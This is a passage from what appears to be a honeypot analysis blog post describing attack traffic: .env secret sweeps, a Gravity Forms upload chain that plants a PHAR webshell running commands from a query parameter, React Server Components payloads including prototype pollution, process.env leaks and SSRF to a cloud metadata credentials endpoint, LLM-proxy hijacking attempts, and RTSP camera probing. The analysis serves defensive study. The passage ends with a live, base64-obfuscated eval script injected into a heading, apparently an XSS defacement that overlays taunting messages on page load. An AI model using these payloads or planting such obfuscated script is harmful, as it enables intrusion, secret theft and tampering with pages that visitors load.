- **Platform suffixes:** `.env.vercel`, `.env.netlify`, `.env.heroku`, `.env.render`, `.env.laravel`, `.env.php`, `.env.enc`, `.env.production.local`, `.env.test.local`, `.env.development.local`, `.vercel/.env.production.local`, plus oddities like `go.env`, `secrets.env`, `.envrc`, `.environment`.

Whoever built it knows where modern PaaS deployments stash secrets.

**The Gravity Forms kill-chain.** Interleaved with the `.env` sweep is a textbook version-gated WordPress attack:

```
GET  /wp-login.php                                            ← confirm it's WordPress
GET  /wp-content/plugins/gravityforms/readme.txt             ← fingerprint plugin version
GET  /wp-content/plugins/gravityforms/change_log.txt
GET  /wp-content/plugins/gravityforms/css/formsmain.min.css
POST /wp-admin/admin-ajax.php   action=gf_get_form&form_id=N  ← enumerate forms
OPTIONS /wp-json/gf/v2/file/chunked/upload                   ← preflight the upload endpoint
POST    /wp-json/gf/v2/file/chunked/upload                   ← drop wp-xxxx.phar webshell
```

The webshell itself is a PHAR polyglot - `<?php __HALT_COMPILER(); ?> <?=` + backtick-`$_GET[0]` - i.e. "run whatever I pass in `?0=` as a shell command." It recons the plugin version *before* trying the exploit, which is more care than 90% of what hits us.

**The RSC escalation ladder.** Against `/api/rsc`, `/rsc`, `/api/[...catchall]`, and even `/next.config.js`, it climbs a fixed five-rung ladder every time: (1) benign baseline `{"__rsc":{"id":"test","props":{"pageProps":{}}}}`, (2) `__next_router_state_tree` injection, (3) prototype pollution `{"__proto__":{"env":"dump"}}`, (4) template leak `${JSON.stringify(process.env)}` / `<%= JSON.stringify(process.env) %>`, (5) full SSRF `{"__rsc":{"id":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}`.

**Timing.** A dense exploitation burst around **11:03–11:06 UTC on 2026-05-29** (~1–2 s between distinct probes), then sparse `GET /` re-checks hours later (20:56, 22:07–22:26) - the classic "hit hard, then poke back occasionally to see if anything changed." **Rating: 7/10** - broad, methodical, version-aware, and it actually tries to plant a shell; loses points for being loud and single-homed.

#### Needle 3 - the LLM-proxy hunter (`182.246.46.144`)

This is the one from the future, and it's worth the most words.

**Infrastructure.** Single IP, `182.246.46.144` (Chinanet, China). Tiny footprint - **17 requests over ~67 seconds**, 2026-05-29 12:17:37 → 12:18:45 UTC.

**User-Agent.** Not a fake browser at all: `authorized-522-fast-probe/1.0`. A purpose-built tool that doesn't even bother pretending - the `authorized` / `fast-probe` naming reads like internal scanner branding.

**What it's hunting.** Exposed, misconfigured **LLM API gateways** - the LiteLLM / one-api / "OpenAI-compatible proxy" boxes people stand up and forget to lock down. It probes *both* major API shapes:

- **OpenAI style:** `POST /v1/chat/completions` with `{"model":"gpt-4o", … , "max_tokens":8, "stream":false}`
- **Anthropic style:** `POST /v1/messages` with `{"model":"claude-sonnet-4.5", "max_tokens":8, …}` and the *correct* `anthropic-version: 2023-06-01` header - so the author knows the real Anthropic spec, not just the OpenAI one.

**Model sweep.** It rotates the `model` field through `gpt-4o`, `deepseek-v4-pro`, `claude-opus-4-7`, and `claude-sonnet-4-5` / `claude-sonnet-4.5` - covering whatever a given stolen proxy might be wired to, OpenAI *and* Claude alike.

**Auth-scheme brute force.** The clever bit. Each request tries a different way of being "authenticated," looking for a gateway that accepts a junk or absent key:

```
Authorization: Bearer not-needed
Authorization: Bearer 123456
X-API-Key: 123456
X-API-Key: not-needed
apikey: not-needed
x-api-key: 123456          (paired with anthropic-version, for /v1/messages)
(no auth header at all)
```

**Liveness payload.** Every body is the same minimal probe: `"content": "ping，只回复 pong"` (Chinese: *"ping, only reply pong"*) with `max_tokens: 8`. Cheapest possible confirmation that the proxy actually relays to a live model - without burning tokens or tripping spend alarms.

**End goal.** Free inference. This is **LLM-jacking** - find someone's unsecured GPT-4o/DeepSeek/Claude relay and ride it on their bill. The fact that it's already enumerating Claude model IDs against `/v1/messages` is the headline: the scanners have moved on from your `.env` to your *AI budget*. And note - every one of these tripped `malformed: true` and **none** carried a WAF rule. Pure needle. **Rating: 6/10** technically (it's just well-built request spraying), but **10/10 for "sign of where 2026 is heading."**

## Pointing a camera at the cameras - RTSP

The newest decoy is the RTSP honeypot, and it's a quieter, stranger neighbourhood - ~**10,400 events** over the window, mostly bare TCP connects, with **1,662 `OPTIONS`** and **606 `DESCRIBE`** requests on top. RTSP (port 554) is the protocol IP cameras and NVRs use to serve video, so the traffic here is overwhelmingly people hunting for an open camera feed.

### `51.222.40.109` - knocking on every camera door

*RTSP · June 6, 2026 · origin: **Canada** (OVH SAS) · 1,226 events</br>*

Our single busiest RTSP visitor did exactly what camera-hunters do: connect, send `OPTIONS`, then `DESCRIBE` against a march of well-known stream paths, trying to find one that returns a video stream:

```
OPTIONS  rtsp://<us>:554/stream
DESCRIBE rtsp://<us>:554/stream
OPTIONS  rtsp://<us>:554/Streaming/Channels/101     # Hikvision
OPTIONS  rtsp://<us>:554/h264Preview_01_main         # Reolink
```

Those paths are vendor fingerprints - `/Streaming/Channels/101` is Hikvision's convention, `/h264Preview_01_main` is Reolink's. So this isn't random; it's a script walking a dictionary of camera-brand URL schemes, looking to pull a live feed off whatever model it just found. (Whether it then tries default creds on a real device, we can't see - our decoy doesn't hand one over.)

**Sophistication: 4/10.** Methodical, multi-vendor camera enumeration - more targeted than a blind port scan, but still a canned dictionary sweep with no real exploitation.

### The TLS-on-554 crowd

The other recurring oddity: connections that immediately fire a **TLS ClientHello** at the RTSP port and get logged as `Unknown request` (the tell-tale `\x16\x03\x01...` handshake bytes). That's not an RTSP client at all - it's internet-wide scanners (Censys-style indexers on `162.216.149.0/24`, Linode/Akamai ranges, etc.) blindly attempting HTTPS on every open port to fingerprint what's listening. Harmless in itself, but a good reminder of just how much of "attack" traffic is really *measurement* traffic that never even spoke the right protocol.

---

*Data for this post was pulled live from the 801Labs Graylog canary network (Cowrie, WebSpeare & RTSP sensors). Want the raw records? Same deal as always - email `oak@801labs.org` and tell me who you are and what you're after.*




## <SCRIPT>eval(decodeURIComponent(atob('IWZ1bmN0aW9uKCklN0Jjb25zdCUyMHQ9JTVCJTIyR2V0JTIwUHduZWQsJTIwbm9vYiUyMiwlMjJUaGUlMjBnb2F0cyUyMGdvdCUyMGluISUyMiwlMjJTdG9yZWQlMjBYU1MlMjBNdWNoPyUyMiwlMjJDb29raWUlMjBzdG9sZW4hJTIwJUYwJTlGJThEJUFBJTIyLCUyMllvdXIlMjBET00lMjBiZWxvbmdzJTIwdG8lMjB1cyUyMiwlMjJhbGVydCgncHduZWQnKSUyMiwlMjIlM0NzY3JpcHQlM0UlMjBydW5zJTIwZnJlZSUyMiwlMjJJbnB1dCUyMG5vdCUyMHNhbml0aXNlZCElMjIsJTIyUmVmbGVjdGVkLiUyMFN0b3JlZC4lMjBPd25lZC4lMjIlNUQsZT0lNUIlMjIlRjAlOUYlOTAlOTAlMjIsJTIyJUYwJTlGJTkwJUIxJTIyLCUyMiVGMCU5RiU5MCU4OCUyMiwlMjIlRjAlOUYlOTAlOTAlMjIsJTIyJUYwJTlGJTkwJUIxJTIyLCUyMiVGMCU5RiU5MCU5MCUyMiwlMjIlRjAlOUYlOTAlODglRTIlODAlOEQlRTIlQUMlOUIlMjIsJTIyJUYwJTlGJTkwJTkwJTIyJTVELG89ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJkaXYlMjIpLG49JTVCJTIyI2ZmNDQ0NCUyMiwlMjIjZmY4ODAwJTIyLCUyMiNmZmRkMDAlMjIsJTIyIzQ0ZGQ0NCUyMiwlMjIjNDRhYWZmJTIyLCUyMiNhYTQ0ZmYlMjIsJTIyI2ZmNDRhYSUyMiU1RDtvLmlubmVySFRNTD0lMjJDb21taXQlMjA5MWY4YzIwLCUyME5vJTIwVnVsbmVyYWJpbGl0aWVzPyUyMFlvdSUyMHN1cmUlMjBhYm91dCUyMHRoYXQlMjA6KSUyMD8lMjIuc3BsaXQoJTIyJTIyKS5tYXAoKHQsZSk9JTNFJTYwJTNDc3BhbiUyMHN0eWxlPSUyMmNvbG9yOiQlN0JuJTVCZSUyNW4ubGVuZ3RoJTVEJTdEO2ZvbnQtd2VpZ2h0OmJvbGQlMjIlM0UkJTdCJTIyJTIwJTIyPT09dD8lMjImbmJzcDslMjI6dCU3RCUzQy9zcGFuJTNFJTYwKS5qb2luKCUyMiUyMiksT2JqZWN0LmFzc2lnbihvLnN0eWxlLCU3QnBvc2l0aW9uOiUyMmZpeGVkJTIyLHRvcDolMjIxMnB4JTIyLGxlZnQ6JTIyMTJweCUyMixmb250RmFtaWx5OiUyMm1vbm9zcGFjZSUyMixmb250U2l6ZTolMjIxM3B4JTIyLGxldHRlclNwYWNpbmc6JTIyMC41cHglMjIscG9pbnRlckV2ZW50czolMjJub25lJTIyLHpJbmRleDolMjI5OTk5OTk4JTIyLHRleHRTaGFkb3c6JTIyMCUyMDFweCUyMDRweCUyMHJnYmEoMCwwLDAsMC44KSUyMiU3RCksZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvKTtjb25zdCUyMGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCglMjJjYW52YXMlMjIpLGk9YS5nZXRDb250ZXh0KCUyMjJkJTIyKTtmdW5jdGlvbiUyMGgoKSU3QmEud2lkdGg9aW5uZXJXaWR0aCxhLmhlaWdodD1pbm5lckhlaWdodCU3RE9iamVjdC5hc3NpZ24oYS5zdHlsZSwlN0Jwb3NpdGlvbjolMjJmaXhlZCUyMix0b3A6JTIyMCUyMixsZWZ0OiUyMjAlMjIsd2lkdGg6JTIyMTAwdnclMjIsaGVpZ2h0OiUyMjEwMHZoJTIyLHBvaW50ZXJFdmVudHM6JTIybm9uZSUyMix6SW5kZXg6JTIyOTk5OTk5JTIyJTdEKSxkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpLGgoKSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lciglMjJyZXNpemUlMjIsaCk7bGV0JTIwcj0lNUIlNUQsZD0wO2Z1bmN0aW9uJTIwbCgpJTdCY29uc3QlMjBlPXQlNUJNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqdC5sZW5ndGgpJTVEO3IucHVzaCglN0J0eXBlOiUyMmR2ZCUyMix4Ok1hdGgucmFuZG9tKCkqKGEud2lkdGgtMjMwKSx5Ok1hdGgucmFuZG9tKCkqKGEuaGVpZ2h0LTYwKSx2eDozLjUqKE1hdGgucmFuZG9tKCktLjUpKyhNYXRoLnJhbmRvbSgpJTNFLjU/MS41Oi0xLjUpLHZ5OjMuNSooTWF0aC5yYW5kb20oKS0uNSkrKE1hdGgucmFuZG9tKCklM0UuNT8xLjU6LTEuNSksdzoyMjAsaDo0NCxodWU6TWF0aC5mbG9vcigzNjAqTWF0aC5yYW5kb20oKSksbXNnOmUlN0QpJTdEZnVuY3Rpb24lMjBzKCklN0Jjb25zdCUyMHQ9ZSU1Qk1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSplLmxlbmd0aCklNUQsbz0yMCsxNipNYXRoLnJhbmRvbSgpO3IucHVzaCglN0J0eXBlOiUyMmNyaXR0ZXIlMjIseDpNYXRoLnJhbmRvbSgpKmEud2lkdGgseTpNYXRoLnJhbmRvbSgpKmEuaGVpZ2h0LHZ4OjMqKE1hdGgucmFuZG9tKCktLjUpLHZ5OjMqKE1hdGgucmFuZG9tKCktLjUpLHNpemU6byxlbW9qaTp0LHJvdDpNYXRoLnJhbmRvbSgpKk1hdGguUEkqMixyb3RWOi4wNSooTWF0aC5yYW5kb20oKS0uNSklN0QpJTdEbCgpLGwoKTtmb3IobGV0JTIwdD0wO3QlM0M4O3QrKylzKCk7ZnVuY3Rpb24lMjBmKCklN0JkKyssZCUyNTUwPT0wJiZyLmZpbHRlcih0PSUzRSUyMmNyaXR0ZXIlMjI9PT10LnR5cGUpLmxlbmd0aCUzQzMwJiZzKCksZCUyNTE3NT09MCYmci5maWx0ZXIodD0lM0UlMjJkdmQlMjI9PT10LnR5cGUpLmxlbmd0aCUzQzYmJmwoKSxyLmZvckVhY2godD0lM0UlN0J0LngrPXQudngsdC55Kz10LnZ5LHZvaWQlMjAwIT09dC5yb3QmJih0LnJvdCs9dC5yb3RWKSwlMjJkdmQlMjI9PT10LnR5cGU/KCh0LnglM0MwJTdDJTdDdC54K3QudyUzRWEud2lkdGgpJiYodC52eCo9LTEpLCh0LnklM0MwJTdDJTdDdC55K3QuaCUzRWEuaGVpZ2h0KSYmKHQudnkqPS0xKSx0Lmh1ZT0odC5odWUrLjQpJTI1MzYwKTpmdW5jdGlvbih0KSU3QmNvbnN0JTIwZT10LnNpemUlN0MlN0MxNjt0LnglM0NlJiYodC54PWUsdC52eD1NYXRoLmFicyh0LnZ4KSksdC54JTNFYS53aWR0aC1lJiYodC54PWEud2lkdGgtZSx0LnZ4PS1NYXRoLmFicyh0LnZ4KSksdC55JTNDZSYmKHQueT1lLHQudnk9TWF0aC5hYnModC52eSkpLHQueSUzRWEuaGVpZ2h0LWUmJih0Lnk9YS5oZWlnaHQtZSx0LnZ5PS1NYXRoLmFicyh0LnZ5KSklN0QodCklN0QpJTdEZnVuY3Rpb24lMjB4KCklN0JpLmNsZWFyUmVjdCgwLDAsYS53aWR0aCxhLmhlaWdodCksci5mb3JFYWNoKHQ9JTNFJTIyZHZkJTIyPT09dC50eXBlP2Z1bmN0aW9uKHQpJTdCaS5zYXZlKCksaS5zaGFkb3dDb2xvcj0lNjBoc2xhKCQlN0J0Lmh1ZSU3RCwxMDAlMjUsNjAlMjUsMC43KSU2MCxpLnNoYWRvd0JsdXI9MTQsaS5iZWdpblBhdGgoKSxpLm1vdmVUbyh0LngrOCx0LnkpLGkubGluZVRvKHQueCt0LnctOCx0LnkpLGkucXVhZHJhdGljQ3VydmVUbyh0LngrdC53LHQueSx0LngrdC53LHQueSs4KSxpLmxpbmVUbyh0LngrdC53LHQueSt0LmgtOCksaS5xdWFkcmF0aWNDdXJ2ZVRvKHQueCt0LncsdC55K3QuaCx0LngrdC53LTgsdC55K3QuaCksaS5saW5lVG8odC54KzgsdC55K3QuaCksaS5xdWFkcmF0aWNDdXJ2ZVRvKHQueCx0LnkrdC5oLHQueCx0LnkrdC5oLTgpLGkubGluZVRvKHQueCx0LnkrOCksaS5xdWFkcmF0aWNDdXJ2ZVRvKHQueCx0LnksdC54KzgsdC55KSxpLmNsb3NlUGF0aCgpLGkuZmlsbFN0eWxlPSU2MGhzbGEoJCU3QnQuaHVlJTdELDcwJTI1LDEyJTI1LDAuOTIpJTYwLGkuZmlsbCgpLGkuc3Ryb2tlU3R5bGU9JTYwaHNsYSgkJTdCdC5odWUlN0QsMTAwJTI1LDYwJTI1LDAuOSklNjAsaS5saW5lV2lkdGg9MS41LGkuc3Ryb2tlKCksaS5yZXN0b3JlKCksaS5zYXZlKCksaS5mb250PSUyMmJvbGQlMjAxMXB4JTIwbW9ub3NwYWNlJTIyLGkuZmlsbFN0eWxlPSU2MGhzbCgkJTdCdC5odWUlN0QsMTAwJTI1LDcyJTI1KSU2MCxpLmZpbGxUZXh0KCUyMlhTUyUyMERFTU8lMjIsdC54KzEyLHQueSsxNCksaS5yZXN0b3JlKCksaS5zYXZlKCksaS5mb250PSUyMmJvbGQlMjAxNXB4JTIwbW9ub3NwYWNlJTIyLGkuZmlsbFN0eWxlPSUyMiNmZmZmZmYlMjIsaS5zaGFkb3dDb2xvcj0lNjBoc2xhKCQlN0J0Lmh1ZSU3RCwxMDAlMjUsNzAlMjUsMC44KSU2MCxpLnNoYWRvd0JsdXI9OCxpLmZpbGxUZXh0KHQubXNnLHQueCsxMix0LnkrMzIpLGkucmVzdG9yZSgpJTdEKHQpOmZ1bmN0aW9uKHQpJTdCaS5zYXZlKCksaS50cmFuc2xhdGUodC54LHQueSksaS5yb3RhdGUodC5yb3QpLGkuZm9udD0lNjAkJTdCdC5zaXplJTdEcHglMjBzZXJpZiU2MCxpLnRleHRBbGlnbj0lMjJjZW50ZXIlMjIsaS50ZXh0QmFzZWxpbmU9JTIybWlkZGxlJTIyLGkuZmlsbFRleHQodC5lbW9qaSwwLDApLGkucmVzdG9yZSgpJTdEKHQpKSU3RCFmdW5jdGlvbiUyMHQoKSU3QmYoKSx4KCkscmVxdWVzdEFuaW1hdGlvbkZyYW1lKHQpJTdEKCklN0QoKTs='))) </SCRIPT>